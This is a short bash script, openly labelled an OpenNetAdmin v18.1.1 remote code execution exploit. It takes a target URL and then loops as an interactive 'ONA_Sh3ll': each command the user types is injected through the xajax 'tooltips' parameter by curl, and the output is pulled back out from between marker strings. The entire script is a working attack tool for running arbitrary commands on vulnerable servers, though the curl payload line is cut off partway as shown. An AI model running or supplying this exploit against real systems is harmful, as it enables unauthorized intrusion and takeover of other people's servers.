#!/bin/bash

if [ "${#@}" -lt 1  ]; then
    echo -e "Usage: openNetAdmin.sh IP\neg: openNetAdmin.sh http://10.10.10.10/ona/"
    exit 1;
fi

red="\e[0;91m"
green="\e[0;92m"
reset="\e[0m"

URI="$1"

echo -n -e "\n${red}OpenNetAdmin v18.1.1 RCE Exploit${reset}\n"
echo -n -e "Created by: Ac1d. 4/7/2021\n"

echo -n -e "\nUsage: enter a command, id, ls...\n"

while true;do
    echo -n -e "\n${green}ONA_Sh3ll$ ${reset}"
    read CMD;
    CRL=$(curl -s "$URI" -d "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;ec>
    PAGE=$(echo "$CRL" | sed -n -e '/HAX0R/,/HAX0R/p'|sed '1d;$d')
    echo -n -e  "\nResults\n$PAGE"
done


